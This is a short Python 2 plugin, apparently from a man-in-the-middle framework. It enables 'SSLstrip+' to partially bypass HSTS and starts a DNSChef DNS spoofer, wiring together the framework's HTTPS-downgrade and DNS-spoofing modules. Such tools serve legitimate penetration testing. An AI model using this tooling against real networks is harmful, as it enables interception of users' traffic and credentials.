#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
import dns.resolver
import logging

from plugins.plugin import Plugin
from core.utils import SystemConfig
from core.sslstrip.URLMonitor import URLMonitor
from libs.dnschef.dnschef import start_dnschef

class HSTSbypass(Plugin):
	name     = 'SSLstrip+'
	optname  = 'hsts'
	desc     = 'Enables SSLstrip+ for partial HSTS bypass'
	version  = "0.4"
	tree_output   = ["SSLstrip+ by Leonardo Nve running", "DNSChef v0.3 online"]
	has_opts = False
	req_root = True

	def initialize(self, options):
		self.options = options
		self.manualiptables = options.manualiptables

		try:
			hstsconfig = options.configfile['SSLstrip+']
			dnsconfig  = options.configfile['Spoof']['DNS']
		except Exception, e:
			sys.exit("[-] Error parsing config for SSLstrip+: " + str(e))

		URLMonitor.getInstance().setHstsBypass(hstsconfig)

		start_dnschef(options, dnsconfig, hstsconfig)
